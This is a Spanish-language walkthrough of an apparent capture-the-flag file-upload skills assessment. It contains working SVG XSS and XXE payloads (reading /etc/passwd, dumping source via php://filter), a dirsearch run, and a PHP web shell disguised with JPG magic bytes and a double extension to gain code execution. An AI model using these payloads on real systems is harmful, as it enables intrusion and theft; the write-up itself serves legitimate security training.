
# File Uploads - Skills Assessment

Se le ha encomendado realizar una prueba de penetración para la aplicación web de comercio electrónico de una empresa. La aplicación web se encuentra en sus primeras etapas, por lo que solo probará los formularios de carga de archivos que encuentre.

Intente utilizar lo que aprendió en este módulo para comprender cómo funciona el formulario de carga y cómo omitir varias validaciones implementadas (si las hay) para obtener la ejecución remota de código en el servidor back-end.

***

## Objetivo

```
94.237.49.212:55154
```

Intente explotar el formulario de carga para leer la flag que se encuentra en el directorio raíz "/".

<figure><img src="/files/YoBMkARFkStZv88lPHPP" alt=""><figcaption></figcaption></figure>

La web que vamos a auditar es un ecommerce en sus primeras fases de construcción. Si nos vamos a la sección de "Contact us" encontramos el formulario de carga de archivos.

<figure><img src="/files/Ui6cB39lslCKeGyfwWRC" alt=""><figcaption></figcaption></figure>

## Código fuente

<figure><img src="/files/AFnYERVaUZsU2MGpnNOB" alt=""><figcaption></figcaption></figure>

Encontramos que utiliza una validación de archivos de imagen y un script que se asegura de que únicamente se suban este tipo de archivos. Vamos a editarlo desde el front y intentar cargar un archivo .php:

<figure><img src="/files/u5I0VT7FyJLZPzWK327q" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/AqFFyq5DcnQeqUQ31rv0" alt=""><figcaption></figcaption></figure>

Nos da un error "`Entension not allowed`", por lo que utilizará otros métodos de validación de extensiones.

### Prueba de XSS

Al subir un SVG con un script XSS inyectado, vemos que es vulnerable, hemos utilizado este script:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

<figure><img src="/files/G5dhxsxh9uWu9tQ5KKAl" alt=""><figcaption></figcaption></figure>

Además vemos que se sube correctamente en la respuesta:

<figure><img src="/files/JFPjtRxX9yFrey3tTbRv" alt=""><figcaption></figcaption></figure>

### Prueba de XXE

Si subimos un SVG con el siguiente contenido, vemos que nos devuelve el contenido de un archivo como `/etc/passwd`. Intentamos hacernos con la flag de este modo pero no podemos, igual porque tiene un nombre distintoN:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

<figure><img src="/files/BH2F3Nd0nerlcnBV7QKC" alt=""><figcaption></figcaption></figure>

Podríamos probar a utilizar este tipo de XXE para obtener el contenido de la página donde se cargan los archivos para obtener más información. Para ello podríamos usar fuzzing para descubrir el directorio de subida.

### Fuzzing de directorios

```shell-session
dirsearch -u http://94.237.59.199:59725/contact/ -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/reports/http_94.237.59.199_59725/_contact__24-09-13_10-22-33.txt

Target: http://94.237.59.199:59725/

[10:22:33] Starting: contact/
[10:24:38] 200 -   23B  - /contact/upload.php
```

Ahora que hemos descubierto el directorio de subida `upload.php`, vamos a utilizar un svg con el siguiente contenido para obtener el contenido codificado en base64 de upload.php, con el objetivo de encontrar más información relevante:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

<figure><img src="/files/LpNOU8duiIInLYYs1LWO" alt=""><figcaption></figcaption></figure>

Como vemos, al subir este SVG nos devuelve el código fuente de la página `upload.php` codificado en base64. Ahora vamos a usar Cyberchef para decodificarlo y obtener la información:

<figure><img src="/files/HGUOor8h8jk9wCjv9P9z" alt=""><figcaption></figcaption></figure>

Como vemos, obtenemos el directorio donde se suben los archivos: `/user_feedback_submissions/`

## Prueba de subida de imagen real

Vamos a hacer una prueba subiendo una imagen real para ver como se comporta la aplicación.

<figure><img src="/files/RRRzQgs6cR3kWLhLEaSc" alt=""><figcaption></figcaption></figure>

Al subir la imagen vemos que a priori se sube correctamente, pero al acceder a la imagen no podemos. Investigando un poco, descubrimos en el código de la página `upload.php`, que los archivos son renombrados antes de subirse al servidor con el siguiente formato: `yymmdd_$filename`

<figure><img src="/files/fImwowDFf0lnzggffSa4" alt=""><figcaption></figcaption></figure>

Entonces probamos a acceder de nuevo, poniendo delante de fecha de subida y buuuum! Ya podemos acceder a la imagen (si, es una imagen de una shell)

<figure><img src="/files/DxYGHEEKpxchUmC0p3mj" alt=""><figcaption></figcaption></figure>

Ahora que ya sabemos el funcionamiento de la aplicación vamos a intentar cargar nuestra `shell.php`:

```php
<?php system($_REQUEST[cmd]); ?>
```

```php
<?php system($_REQUEST[cmd]); ?>
```

Vamos a renombrar este archivo con una doble extensión como `shell.phar.jpg` y vamos a probar a subirlo. Pero antes vamos a añadir un MIME Type válido de una imagen JPG legítima de la siguiente manera:

```bash
# Copia la cabecera de un archivo JPG válido
dd if=/path/to/valid.jpg of=shell.phar.jpg bs=1 count=3

# Añade el código PHP al archivo
echo "<?php system(\$_REQUEST['cmd']); ?>" >> shell.phar.jpg
```

<figure><img src="/files/7Qs2kxfxXuMVePlWvZMM" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/qipGBgFpGCeeatNsZtYQ" alt=""><figcaption></figcaption></figure>

Buuum! Se sube correctamente! Ahora vamos a acceder a la ruta que ya conocemos e intentar ejecutar la shell para que nos de más info:

<figure><img src="/files/BhVeb0rPjyxo0YNy4qx5" alt=""><figcaption></figcaption></figure>

Al hacer un ls del directorio / nos encontramos con que la flag tiene un nombre random:

<figure><img src="/files/VkRBINZPvMFFjAcPHcn2" alt=""><figcaption></figcaption></figure>

Y con cat podemos acceder al archivo para leerlo sin problema, obteniendo la flag!

<figure><img src="/files/q7Kp8o3ZnXuGIpMSPKu6" alt=""><figcaption></figcaption></figure>
